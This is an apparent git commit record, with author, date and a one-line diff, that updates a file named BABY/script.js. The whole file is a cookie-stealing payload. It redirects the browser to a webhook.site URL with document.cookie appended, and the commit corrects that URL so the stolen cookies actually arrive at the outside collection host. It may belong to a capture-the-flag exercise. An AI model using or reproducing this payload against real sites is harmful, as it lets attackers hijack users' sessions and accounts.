1cc7171278ac76777278fa065125d38dd65c6d61
NGUYỄN THÀNH ĐẠT <ntdat23121999@gmail.com>
2025-06-28 12:26:13 +0700

    Update script.js

--- BABY/script.js
+++ BABY/script.js
@@ -1,1 +1,1 @@
-document.location="https://webhook.site/#!/view/7bed4386-411c-4def-94d4-c8615cd435f1"+document.cookie
+document.location="https://webhook.site/7bed4386-411c-4def-94d4-c8615cd435f1"+document.cookie
